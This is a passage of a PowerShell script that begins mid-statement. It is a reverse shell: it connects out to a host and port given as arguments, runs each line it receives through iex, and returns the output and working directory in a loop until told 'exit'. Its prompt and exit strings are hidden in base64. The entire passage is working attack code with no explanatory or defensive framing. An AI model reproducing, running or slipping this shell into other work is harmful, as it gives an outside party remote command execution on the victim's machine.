System.Net.Sockets.TcpClient($args[0],$args[1]);
if($servidor -eq $null){exit 1}
$transferencia = $servidor.GetStream();
$Escribir = new-object System.IO.StreamWriter($transferencia);
$Bfr = new-object System.Byte[] 1024;
$Encoding = new-object System.Text.AsciiEncoding;
do{        
        $Escribir.Write($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABTAD4AIAA='))));
        $Escribir.Flush();
        $Lectura = $null;
        while($transferencia.DataAvailable  -or ($Lectura = $transferencia.Read($Bfr, 0, 1024)) -eq $null){}
        $ReciMens = ($Encoding, $Bfr, 0)
        $data = $Encoding.GetString($Bfr, 0, $Lectura)
        $SB = (iex $data 2>&1 | Out-String );
        $directorio  = $SB + (pwd).Path + '> ';
        $SB2  = $SB;
        $sendbyte = ($Encoding).GetBytes($directorio);
        $Escribir.Write($sendbyte,0,$sendbyte.Length);
}While (!$data.equals($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AGkAdAA=')))))
$Escribir.close();$servidor.close();
